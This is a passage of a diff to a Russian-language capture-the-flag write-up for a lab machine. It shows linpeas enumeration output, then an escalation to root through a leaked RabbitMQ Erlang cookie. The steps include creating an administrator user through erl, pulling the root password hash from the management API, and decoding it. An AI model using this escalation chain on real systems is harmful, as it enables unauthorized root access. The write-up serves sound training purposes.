-   131348     28 -rw-r-----   1 root     adm         26028 Sep 12  2024 /var/log/dmesg.3.gz
-   132348     12 -rw-r-----   1 syslog   adm          9411 Sep  9  2024 /var/log/auth.log.3.gz
-   133839      4 -rw-r-----   1 syslog   adm          1152 Oct  2 04:18 /var/log/auth.log
-   132391    204 -rw-r-----   1 root     adm        203892 Oct  2 03:10 /var/log/cloud-init-output.log
-   132429      0 -rw-r--r--   1 landscape landscape        0 Mar 20  2024 /var/log/landscape/sysinfo.log
-   139268    236 -rw-r-----   1 syslog    adm         240487 Jul 20  2024 /var/log/syslog.7.gz
-   131283     28 -rw-r-----   1 root      adm          25884 Sep 20  2024 /var/log/dmesg.1.gz
-   133711     48 -rw-r-----   1 syslog    adm          41867 Oct  2 04:18 /var/log/syslog
-   134572   1044 -rw-r-----   1 syslog    adm        1062504 Sep 12  2024 /var/log/cloud-init.log.1
-   133179    620 -rw-r-----   1 syslog    adm         634504 Sep 20  2024 /var/log/syslog.2.gz
-   132397    396 -rw-r-----   1 syslog    adm         403735 Sep 20  2024 /var/log/kern.log.2.gz
-   133270    120 -rw-r-----   1 syslog    adm         122696 Jul 18  2024 /var/log/cloud-init.log.3.gz
-   134593      0 -rw-r-----   1 root      adm              0 Sep  9  2024 /var/log/apt/term.log
-   136362     12 -rw-r-----   1 root      adm           9763 Aug 15  2024 /var/log/apt/term.log.1.gz
-   140023     24 -rw-r-----   1 root      adm          23147 Jul 18  2024 /var/log/apt/term.log.2.gz
-   131833     20 -rw-r-----   1 root      adm          18604 Mar 22  2024 /var/log/apt/term.log.3.gz
-   133744      4 -rw-r-----   1 syslog    adm                  824 Oct  2 03:10 /var/log/kern.log
-   131299     48 -rw-r-----   1 root      adm                47167 Oct  2 03:10 /var/log/dmesg
-   133668    144 -rw-r-----   1 syslog    adm               146670 Aug 16  2024 /var/log/cloud-init.log.2.gz
-   133427     60 -rw-r-----   1 rabbitmq  rabbitmq           58564 Oct  2 03:10 /var/log/rabbitmq/rabbitmq-server.log.1
-   131326    676 -rw-r-----   1 rabbitmq  rabbitmq          689427 Oct  2 04:18 /var/log/rabbitmq/erl_crash.dump
-   131640      8 -rw-r-----   1 rabbitmq  rabbitmq            6746 Sep 12  2024 /var/log/rabbitmq/rabbit@forge.log.2.gz
-   132285      4 -rw-r-----   1 rabbitmq  rabbitmq            2136 Sep 11  2024 /var/log/rabbitmq/rabbitmq-server.error.log.4.gz
-   131290      4 -rw-r-----   1 rabbitmq  rabbitmq            1912 Oct  2 03:10 /var/log/rabbitmq/rabbitmq-server.error.log
-   133263      4 -rw-r-----   1 rabbitmq  rabbitmq            3102 Aug 15  2024 /var/log/rabbitmq/rabbit@forge_upgrade.log.1
-   131658     16 -rw-r-----   1 rabbitmq  rabbitmq           16142 Oct  2 03:11 /var/log/rabbitmq/rabbit@forge.log
-   133826     24 -rw-r-----   1 rabbitmq  rabbitmq           22218 Sep 12  2024 /var/log/rabbitmq/rabbitmq-server.log.3.gz
-   131763     24 -rw-r-----   1 rabbitmq  rabbitmq           23844 Sep 11  2024 /var/log/rabbitmq/rabbit@forge.log.3.gz
-   140207      4 -rw-r-----   1 rabbitmq  rabbitmq             600 Jul 20  2024 /var/log/rabbitmq/rabbit@forge_upgrade.log.3.gz
-   133379     16 -rw-r-----   1 rabbitmq  rabbitmq           12332 Oct  2 03:10 /var/log/rabbitmq/rabbitmq-server.error.log.1
-   131839     40 -rw-r-----   1 rabbitmq  rabbitmq           35817 Sep 20  2024 /var/log/rabbitmq/rabbit@forge.log.1
-   133358     12 -rw-r-----   1 rabbitmq  rabbitmq           10762 Sep  9  2024 /var/log/rabbitmq/rabbit@forge.log.4.gz
-   133297      0 -rw-r-----   1 rabbitmq  rabbitmq               0 Aug 16  2024 /var/log/rabbitmq/rabbit@forge_upgrade.log
-   133277      4 -rw-r-----   1 rabbitmq  rabbitmq             444 Jul 23  2024 /var/log/rabbitmq/rabbit@forge_upgrade.log.2.gz
-   131673      8 -rw-r-----   1 rabbitmq  rabbitmq            6022 Sep 20  2024 /var/log/rabbitmq/rabbitmq-server.log.2.gz
-   131853     16 -rw-r-----   1 rabbitmq  rabbitmq           15481 Oct  2 03:11 /var/log/rabbitmq/rabbitmq-server.log
-   133276      4 -rw-r-----   1 rabbitmq  rabbitmq            3476 Sep 12  2024 /var/log/rabbitmq/rabbitmq-server.error.log.3.gz
-   133063      4 -rw-r-----   1 rabbitmq  rabbitmq              90 Aug 15  2024 /var/log/rabbitmq/startup_err
-   133029      4 -rw-r-----   1 rabbitmq  rabbitmq             580 Aug 15  2024 /var/log/rabbitmq/startup_log
-   131661      4 -rw-r-----   1 rabbitmq  rabbitmq            1336 Sep 20  2024 /var/log/rabbitmq/rabbitmq-server.error.log.2.gz
-   133695     12 -rw-r-----   1 rabbitmq  rabbitmq           10977 Sep 11  2024 /var/log/rabbitmq/rabbitmq-server.log.4.gz
-   132426    100 -rw-r-----   1 syslog    adm                99746 Aug 11  2024 /var/log/kern.log.4.gz
-   133831      4 -rw-r-----   1 syslog    adm                 3491 Oct  2 03:10 /var/log/auth.log.1
-   136368     84 -rw-r-----   1 syslog    adm                82432 Aug 15  2024 /var/log/syslog.4.gz
-   132354    356 -rw-r-----   1 syslog    adm               358146 Oct  2 03:10 /var/log/syslog.1
-   131393     48 -rw-r-----   1 root      adm                48818 Sep 20  2024 /var/log/dmesg.0
-   133830    876 -rw-r-----   1 syslog    adm               895788 Sep  9  2024 /var/log/syslog.3.gz
-
-╔══════════╣ Files inside /home/azrael (limit 20)
-total 52                                                                                                                                                                                
-drwx------ 9 azrael azrael 4096 Sep 12  2024 .
-drwxr-xr-x 3 root   root   4096 Jul 18  2024 ..
-lrwxrwxrwx 1 azrael azrael    9 Mar 22  2024 .bash_history -> /dev/null
--rw-r--r-- 1 azrael azrael  220 Feb 25  2020 .bash_logout
--rw-r--r-- 1 azrael azrael 3771 Feb 25  2020 .bashrc
-drwx------ 3 azrael azrael 4096 Jul 18  2024 .cache
-drwxrwxr-x 4 azrael azrael 4096 Aug 16  2024 chatbotServer
-drwx------ 4 azrael azrael 4096 Jul 18  2024 .config
-drwx------ 3 azrael azrael 4096 Oct  2 04:18 .gnupg
-drwxrwxr-x 5 azrael azrael 4096 Jul 18  2024 .local
-drwxrwxr-x 4 azrael azrael 4096 Jul 18  2024 .npm
--rw-r--r-- 1 azrael azrael  807 Feb 25  2020 .profile
-drwx------ 3 azrael azrael 4096 Mar 22  2024 snap
--rw------- 1 azrael azrael   33 Aug 11  2024 user.txt
-
-╔══════════╣ Files inside others home (limit 20)
-/var/www/cloudsite.thm/about_us.html                                                                                                                                                    
-/var/www/cloudsite.thm/services.html
-/var/www/cloudsite.thm/assets/webfonts/fa-light-300.ttf
-/var/www/cloudsite.thm/assets/webfonts/fa-regular-400.svg
-/var/www/cloudsite.thm/assets/webfonts/fa-light-300.svg
-/var/www/cloudsite.thm/assets/webfonts/fa-brands-400.ttf
-/var/www/cloudsite.thm/assets/webfonts/fa-solid-900.eot
-/var/www/cloudsite.thm/assets/webfonts/fa-brands-400.woff
-/var/www/cloudsite.thm/assets/webfonts/fa-brands-400.woff2
-/var/www/cloudsite.thm/assets/webfonts/fa-light-300.woff2
-/var/www/cloudsite.thm/assets/webfonts/fa-solid-900.woff
-/var/www/cloudsite.thm/assets/webfonts/fa-light-300.eot
-/var/www/cloudsite.thm/assets/webfonts/fa-regular-400.ttf
-/var/www/cloudsite.thm/assets/webfonts/fa-solid-900.svg
-/var/www/cloudsite.thm/assets/webfonts/fa-brands-400.svg
-/var/www/cloudsite.thm/assets/webfonts/fa-regular-400.woff
-/var/www/cloudsite.thm/assets/webfonts/fa-solid-900.woff2
-/var/www/cloudsite.thm/assets/webfonts/fa-light-300.woff
-/var/www/cloudsite.thm/assets/webfonts/fa-regular-400.woff2
-/var/www/cloudsite.thm/assets/webfonts/fa-brands-400.eot
-grep: write error: Broken pipe
-
-╔══════════╣ Searching installed mail applications
-                                                                                                                                                                                        
-╔══════════╣ Mails (limit 50)
-                                                                                                                                                                                        
-╔══════════╣ Backup folders
-drwx------ 2 root root 4096 Aug 15  2024 /etc/lvm/backup                                                                                                                                
-drwxr-xr-x 2 root root 3 Apr 15  2020 /snap/core20/1828/var/backups
-total 0
-
-drwxr-xr-x 2 root root 3 Apr 15  2020 /snap/core20/2318/var/backups
-total 0
-
-drwxr-xr-x 2 root root 4096 Aug 16  2024 /var/backups
-total 1120
--rw-r--r-- 1 root root  51200 Jul 18  2024 alternatives.tar.0
--rw-r--r-- 1 root root  53865 Aug 15  2024 apt.extended_states.0
--rw-r--r-- 1 root root   6684 Aug 15  2024 apt.extended_states.1.gz
--rw-r--r-- 1 root root  10084 Aug 14  2024 apt.extended_states.2.gz
--rw-r--r-- 1 root root  10033 Jul 18  2024 apt.extended_states.3.gz
--rw-r--r-- 1 root root   6955 Jul 18  2024 apt.extended_states.4.gz
--rw-r--r-- 1 root root   6871 Mar 22  2024 apt.extended_states.5.gz
--rw-r--r-- 1 root root   6883 Mar 21  2024 apt.extended_states.6.gz
--rw-r--r-- 1 root root    268 Mar 20  2024 dpkg.diversions.0
--rw-r--r-- 1 root root    100 Mar 14  2023 dpkg.statoverride.0
--rw-r--r-- 1 root root 967321 Mar 22  2024 dpkg.status.0
-
-
-╔══════════╣ Backup files (limited 100)
--rwxr-xr-x 1 root root 2196 Feb 23  2024 /usr/libexec/dpkg/dpkg-db-backup                                                                                                               
--rw-r--r-- 1 root root 10849 Jul  5  2024 /usr/lib/modules/5.15.0-118-generic/kernel/drivers/power/supply/wm831x_backup.ko
--rw-r--r-- 1 root root 13113 Jul  5  2024 /usr/lib/modules/5.15.0-118-generic/kernel/drivers/net/team/team_mode_activebackup.ko
--rw-r--r-- 1 root root 44008 Dec  5  2023 /usr/lib/x86_64-linux-gnu/open-vm-tools/plugins/vmsvc/libvmbackup.so
--rw-r--r-- 1 root root 138 Dec  5  2021 /usr/lib/systemd/system/dpkg-db-backup.timer
--rw-r--r-- 1 root root 147 Dec  5  2021 /usr/lib/systemd/system/dpkg-db-backup.service
--rw-r--r-- 1 root root 1423 Aug 15  2024 /usr/lib/python3/dist-packages/sos/report/plugins/__pycache__/ovirt_engine_backup.cpython-310.pyc
--rw-r--r-- 1 root root 1802 Jul 20  2023 /usr/lib/python3/dist-packages/sos/report/plugins/ovirt_engine_backup.py
--rw-r--r-- 1 root root 5564 Apr 26  2023 /usr/lib/erlang/lib/mnesia-4.20.1/ebin/mnesia_backup.beam
--rwxr-xr-x 1 root root 226 Feb 17  2020 /usr/share/byobu/desktop/byobu.desktop.old
--rw-r--r-- 1 root root 11886 Aug 15  2024 /usr/share/info/dir.old
--rw-r--r-- 1 root root 2747 Feb 16  2022 /usr/share/man/man8/vgcfgbackup.8.gz
--rw-r--r-- 1 root root 7867 Jul 16  1996 /usr/share/doc/telnet/README.old.gz
--rw-r--r-- 1 root root 416107 Dec 21  2020 /usr/share/doc/manpages/Changes.old.gz
--rwxr-xr-x 1 root root 1086 Oct 31  2021 /usr/src/linux-headers-5.15.0-118/tools/testing/selftests/net/tcp_fastopen_backup_key.sh
--rw-r--r-- 1 root root 12070 Oct 26  1985 /var/www/storage.cloudsite.thm/node_modules123/form-data/README.md.bak
--rw-r--r-- 1 root root 191 Jul 18  2024 /var/lib/sgml-base/supercatalog.old
--rw-r--r-- 1 root root 0 Aug 15  2024 /var/lib/systemd/deb-systemd-helper-enabled/timers.target.wants/dpkg-db-backup.timer
--rw-r--r-- 1 root root 61 Aug 15  2024 /var/lib/systemd/deb-systemd-helper-enabled/dpkg-db-backup.timer.dsh-also
--rw-r--r-- 1 root root 2743 Mar 14  2023 /etc/apt/sources.list.curtin.old
--rw-r--r-- 1 root root 380 Aug 15  2024 /etc/xml/xml-core.xml.old
--rw-r--r-- 1 root root 375 Aug 15  2024 /etc/xml/docbook-xml.xml.old
--rw-r--r-- 1 root root 359 Aug 15  2024 /etc/xml/catalog.old
--rw-r--r-- 1 root root 357 Aug 15  2024 /etc/xml/sgml-data.xml.old
-
-╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
-Found /var/lib/colord/mapping.db: SQLite 3.x database, last written using SQLite version 3031001, file counter 3, database pages 4, cookie 0x2, schema 4, UTF-8, version-valid-for 3    
-Found /var/lib/colord/storage.db: SQLite 3.x database, last written using SQLite version 3031001, file counter 3, database pages 7, cookie 0x3, schema 4, UTF-8, version-valid-for 3
-Found /var/lib/command-not-found/commands.db: SQLite 3.x database, last written using SQLite version 3037002, file counter 5, database pages 826, cookie 0x4, schema 4, UTF-8, version-valid-for 5
-Found /var/lib/fwupd/pending.db: SQLite 3.x database, last written using SQLite version 3037002, file counter 3, database pages 6, cookie 0x5, schema 4, UTF-8, version-valid-for 3
-
- -> Extracting tables from /var/lib/colord/mapping.db (limit 20)
- -> Extracting tables from /var/lib/colord/storage.db (limit 20)                                                                                                                        
- -> Extracting tables from /var/lib/command-not-found/commands.db (limit 20)                                                                                                            
- -> Extracting tables from /var/lib/fwupd/pending.db (limit 20)                                                                                                                         
-                                                                                                                                                                                        
-╔══════════╣ Web files?(output limit)
-/var/www/:                                                                                                                                                                              
-total 16K
-drwxr-xr-x  4 root root 4.0K Aug 15  2024 .
-drwxr-xr-x 14 root root 4.0K Mar 21  2024 ..
-drwxr-xr-x  3 root root 4.0K Aug 15  2024 cloudsite.thm
-drwxr-xr-x  9 root root 4.0K Aug 15  2024 storage.cloudsite.thm
-
-/var/www/cloudsite.thm:
-total 80K
-drwxr-xr-x  3 root root 4.0K Aug 15  2024 .
-
-╔══════════╣ All relevant hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
--rw-r--r-- 1 root root 0 Oct 11  2022 /usr/local/n/versions/node/20.16.0/lib/node_modules/npm/.npmrc                                                                                    
--rw-r--r-- 1 root root 22 Apr 11  2024 /usr/local/n/versions/node/20.16.0/lib/node_modules/npm/node_modules/node-gyp/.release-please-manifest.json
--rw-r--r-- 1 root root 22 Aug 15  2024 /usr/local/lib/node_modules/npm/node_modules/node-gyp/.release-please-manifest.json
--rw------- 1 root root 0 Apr 16  2024 /snap/core20/2318/etc/.pwd.lock
--rw-r--r-- 1 root root 220 Feb 25  2020 /snap/core20/2318/etc/skel/.bash_logout
--rw------- 1 root root 0 Feb  7  2023 /snap/core20/1828/etc/.pwd.lock
--rw-r--r-- 1 root root 220 Feb 25  2020 /snap/core20/1828/etc/skel/.bash_logout
--rw-r--r-- 1 root root 6148 Aug 15  2024 /var/www/storage.cloudsite.thm/css/bootstrap/.DS_Store
--rw-r--r-- 1 root root 6148 Aug 15  2024 /var/www/storage.cloudsite.thm/css/bootstrap/mixins/.DS_Store
--rw-r--r-- 1 root root 6148 Aug 15  2024 /var/www/storage.cloudsite.thm/css/.DS_Store
--rw-r--r-- 1 root root 6148 Aug 15  2024 /var/www/storage.cloudsite.thm/images/.DS_Store
--rw-r--r-- 1 root root 10244 Aug 15  2024 /var/www/storage.cloudsite.thm/scss/bootstrap/.DS_Store
--rw-r--r-- 1 root root 8196 Aug 15  2024 /var/www/storage.cloudsite.thm/scss/.DS_Store
--rw-r--r-- 1 root root 6148 Aug 15  2024 /var/www/storage.cloudsite.thm/fonts/.DS_Store
--rw-r--r-- 1 root root 6148 Aug 15  2024 /var/www/storage.cloudsite.thm/js/.DS_Store
--rw-r--r-- 1 landscape landscape 0 Mar 14  2023 /var/lib/landscape/.cleanup.user
--rw-r--r-- 1 root root 0 Jul 18  2024 /etc/.java/.systemPrefs/.system.lock
--rw-r--r-- 1 root root 0 Jul 18  2024 /etc/.java/.systemPrefs/.systemRootModFile
--rw------- 1 root root 0 Mar 14  2023 /etc/.pwd.lock
--rw-r--r-- 1 root root 220 Feb 25  2020 /etc/skel/.bash_logout
--rw------- 1 root root 0 Oct  2 03:10 /run/snapd/lock/.lock
--rw-r--r-- 1 root root 20 Oct  2 03:10 /run/cloud-init/.instance-id
--rw-r--r-- 1 root root 2 Oct  2 03:10 /run/cloud-init/.ds-identify.result
--rw-r--r-- 1 azrael azrael 220 Feb 25  2020 /home/azrael/.bash_logout
-
-╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
--rwxr-xr-x 1 azrael azrael 1001072 Jan 19  2026 /tmp/linpeas.sh                                                                                                                         
--rw-r--r-- 1 root root 51200 Jul 18  2024 /var/backups/alternatives.tar.0
-
-╔══════════╣ Searching passwords in history files
-                                                                                                                                                                                        
-╔══════════╣ Searching *password* or *credential* files in home (limit 70)
-/etc/pam.d/common-password                                                                                                                                                              
-/usr/bin/systemd-ask-password
-/usr/bin/systemd-tty-ask-password-agent
-/usr/lib/git-core/git-credential
-/usr/lib/git-core/git-credential-cache
-/usr/lib/git-core/git-credential-cache--daemon
-/usr/lib/git-core/git-credential-store
-  #)There are more creds/passwds files in the previous parent folder
-
-/usr/lib/grub/i386-pc/password.mod
-/usr/lib/grub/i386-pc/password_pbkdf2.mod
-/usr/lib/python3/dist-packages/cloudinit/config/cc_set_passwords.py
-/usr/lib/python3/dist-packages/cloudinit/config/__pycache__/cc_set_passwords.cpython-310.pyc
-/usr/lib/python3/dist-packages/keyring/credentials.py
-/usr/lib/python3/dist-packages/keyring/__pycache__/credentials.cpython-310.pyc
-/usr/lib/python3/dist-packages/launchpadlib/credentials.py
-/usr/lib/python3/dist-packages/launchpadlib/__pycache__/credentials.cpython-310.pyc
-/usr/lib/python3/dist-packages/launchpadlib/tests/__pycache__/test_credential_store.cpython-310.pyc
-/usr/lib/python3/dist-packages/launchpadlib/tests/test_credential_store.py
-/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/client_credentials.py
-/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/client_credentials.cpython-310.pyc
-/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/resource_owner_password_credentials.cpython-310.pyc
-/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/resource_owner_password_credentials.py
-/usr/lib/python3/dist-packages/twisted/cred/credentials.py
-/usr/lib/python3/dist-packages/twisted/cred/__pycache__/credentials.cpython-310.pyc
-/usr/lib/rabbitmq/lib/rabbitmq_server-3.9.13/plugins/credentials_obfuscation-2.4.0
-/usr/lib/rabbitmq/lib/rabbitmq_server-3.9.13/plugins/credentials_obfuscation-2.4.0/ebin/credentials_obfuscation.app
-/usr/lib/rabbitmq/lib/rabbitmq_server-3.9.13/plugins/credentials_obfuscation-2.4.0/ebin/credentials_obfuscation_app.beam
-/usr/lib/rabbitmq/lib/rabbitmq_server-3.9.13/plugins/credentials_obfuscation-2.4.0/ebin/credentials_obfuscation.beam
-/usr/lib/rabbitmq/lib/rabbitmq_server-3.9.13/plugins/credentials_obfuscation-2.4.0/ebin/credentials_obfuscation_pbe.beam
-  #)There are more creds/passwds files in the previous parent folder
-
-
-╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
-                                                                                                                                                                                        
-╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
-                                                                                                                                                                                        
-╔══════════╣ Searching passwords inside logs (limit 70)
-/var/log/bootstrap.log: base-passwd depends on libc6 (>= 2.8); however:                                                                                                                 
-/var/log/bootstrap.log: base-passwd depends on libdebconfclient0 (>= 0.145); however:
-/var/log/bootstrap.log:dpkg: base-passwd: dependency problems, but configuring anyway as you requested:
-/var/log/bootstrap.log:Preparing to unpack .../base-passwd_3.5.47_amd64.deb ...
-/var/log/bootstrap.log:Preparing to unpack .../passwd_1%3a4.8.1-1ubuntu5_amd64.deb ...
-/var/log/bootstrap.log:Selecting previously unselected package base-passwd.
-/var/log/bootstrap.log:Selecting previously unselected package passwd.
-/var/log/bootstrap.log:Setting up base-passwd (3.5.47) ...
-/var/log/bootstrap.log:Setting up passwd (1:4.8.1-1ubuntu5) ...
-/var/log/bootstrap.log:Shadow passwords are now on.
-/var/log/bootstrap.log:Unpacking base-passwd (3.5.47) ...
-/var/log/bootstrap.log:Unpacking base-passwd (3.5.47) over (3.5.47) ...
-/var/log/bootstrap.log:Unpacking passwd (1:4.8.1-1ubuntu5) ...
-/var/log/dist-upgrade/20240815-0854/apt.log:  Installing libsemanage2 as Depends of passwd
-/var/log/dist-upgrade/20240815-0854/apt.log:  MarkInstall passwd:amd64 < 1:4.8.1-1ubuntu5.20.04.5 -> 1:4.8.1-2ubuntu2.2 @ii umU Ib > FU=0
-/var/log/dist-upgrade/apt.log:  Installing libsemanage2 as Depends of passwd
-/var/log/dist-upgrade/apt.log:  MarkInstall passwd:amd64 < 1:4.8.1-1ubuntu5.20.04.5 -> 1:4.8.1-2ubuntu2.2 @ii umU Ib > FU=0
--#azrael ALL=(ALL) NOPASSWD: /usr/bin/imagecompress.sh
--#azrael ALL=(ALL) NOPASSWD: ALL
-Get:340 http://in.archive.ubuntu.com/ubuntu jammy/main amd64 base-passwd amd64 3.5.52build1 [49.1 kB]
-/var/log/dist-upgrade/screenlog.0:Preparing to unpack .../base-passwd_3.5.52build1_amd64.deb ...
-/var/log/dist-upgrade/screenlog.0:Preparing to unpack .../passwd_1%3a4.8.1-2ubuntu2.2_amd64.deb ...
-/var/log/dist-upgrade/screenlog.0:Setting up base-passwd (3.5.52build1) ...
-/var/log/dist-upgrade/screenlog.0:Setting up passwd (1:4.8.1-2ubuntu2.2) ...
-/var/log/dist-upgrade/screenlog.0:Unpacking base-passwd (3.5.52build1) over (3.5.47) ...
-/var/log/dist-upgrade/screenlog.0:Unpacking passwd (1:4.8.1-2ubuntu2.2) over (1:4.8.1-1ubuntu5.20.04.5) ...
-/var/log/dist-upgrade/screenlog.0:Writing passwd-file to /etc/passwd
-
-╔══════════╣ Checking all env variables in /proc/*/environ removing duplicates and filtering out useless env vars
-HOME=/home/azrael                                                                                                                                                                       
-LANG=en_US.UTF-8
-LESSCLOSE=/usr/bin/lesspipe %s %s
-LESSOPEN=| /usr/bin/lesspipe %s
-_=./linpeas.sh
-LOGNAME=azrael
-OLDPWD=//
-PWD=/home/azrael/chatbotServer
-PWD=//tmp
-PYTHONUNBUFFERED=1
-SHELL=/bin/bash
-SHLVL=1
-SHLVL=2
-USER=azrael
-_=/usr/bin/dd
-_=/usr/bin/grep
-_=/usr/bin/xxd
-WERKZEUG_RUN_MAIN=true
-WERKZEUG_SERVER_FD=3
-WERKZEUG_SERVER_FD=4
 ```
 
-PwnKit тут нету 
+PwnKit тут нету, так как версия ядра пропатчена. Sudo тоже нельзя как то использовать так как ядро было пропатчено. Единственное что еще я увидел так это токен к aws (который никак мне не помог так как я не могу пользоваться им без root прав), и токен rabbitmq, попробуем через него повысить привилегии 
 
 
-sudo тоже нельзя как то использовать
-
-
-по скану видим что открыт куки rabbitmq, попробуем через него повысить привилегии 
-
+Сначала я создам отдельную папку в /tmp для удобства, добавлю туда куки в файл .erlang.cookie, и дам ему права 600
 ```
 zrael@forge:/tmp/az_home$ printf 'uOJn1gFOvRhmAmrX' > /tmp/az_home/.erlang.cookie
 <tf 'uOJn1gFOvRhmAmrX' > /tmp/az_home/.erlang.cookie
@@ -2310,6 +1576,9 @@ azrael@forge:/tmp/az_home$
 azrael@forge:/tmp/az_home$ cat /tmp/az_home/.erlang.cookie; echo
 cat /tmp/az_home/.erlang.cookie; echo
 uOJn1gFOvRhmAmrX
+```
+после этого я решил проверить работает ли на хосте rabbit, или же это просто трата времени
+```
 azrael@forge:/tmp/az_home$ HOME=/tmp/az_home erl -sname azrael -noshell -eval '
   io:format("ping: ~p~n", [net_adm:ping(rabbit@forge)]),
   init:stop().
@@ -2321,17 +1590,22 @@ azrael@forge:/tmp/az_home$ HOME=/tmp/az_home erl -sname azrael -noshell -eval '
 ping: pong
 
 ```
-проверил так же робит ли rabbit чи не 
+как мы видим rabbit ответил нам, так что мы можем продолжать.
+
+
+я хочу проверить пользователей и какие у их права
 
 ```
 [[{user,<<"The password for the root user is the SHA-256 hashed value of the RabbitMQ root user's password. Please don't attempt to crack SHA-256.">>},
   {tags,[]}],
  [{user,<<"root">>},{tags,[administrator]}]]
 ```
-я поискал есть ли пользователи тут и че и как, по итогу вижу что если мы узнаем sha-256 от root RabbitMQ то получим пароль рута буквально.
 
+по итогу вижу сообщение в котором говориться - "The password for the root user is the SHA-256 hashed value of the RabbitMQ root user's password. Please don't attempt to crack SHA-256" если мы узнаем sha-256 от root RabbitMQ то получим пароль рута в системе
 
-я создал пользователя pwn и посмотреть пароль root
+# Создание пользователя в rabbitmq
+
+создаю пользователя pwn с паролем pwn123 с правами - administrator, так же проверяю через curl какой пароль все таки от root
 
 ```
 HOME=/tmp/az_home erl -sname azrael -noshell -eval '
@@ -2352,8 +1626,12 @@ azrael@forge:/tmp/az_home$ curl -s -u pwn:pwn123 http://localhost:15672/api/user
     ],
     "limits": {}
 }
-azrael@forge:/tmp/az_home$ 
+azrael@forge:/tmp/az_home$
 ```
+
+Тут мы наблюдаем картину ввиде base64, расшифровав который мы получаем какую то кашу из битов, так что сразу же я решил использовать xxd -p -c 36 что бы получить вменяемый текст
+
+
 ```
 echo "49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF" | base64 -d | xxd -p -c 36
 
@@ -2362,7 +1640,11 @@ e3d7ba85295d1d16a2617df6f7e6630527ff2f1ebb5c43b3f6ec614811ed194f98073585
 
 e3d7ba85 - это соль, а это уже sha256 295d1d16a2617df6f7e6630527ff2f1ebb5c43b3f6ec614811ed194f98073585
 
+вводим пароль для root
+
 <img width="828" height="113" alt="{ED21F28B-9931-4FFD-B0BD-C8D7EDE5A593}" src="https://github.com/user-attachments/assets/80c6a5c2-df06-4337-b790-9f0b2266421b" />
+
+вот мы и root
 
 <img width="824" height="482" alt="{ACDF1B8C-8599-4567-AE4E-6146A316A975}" src="https://github.com/user-attachments/assets/1a536357-fc6d-420e-b0be-5fcd58aef232" />
 
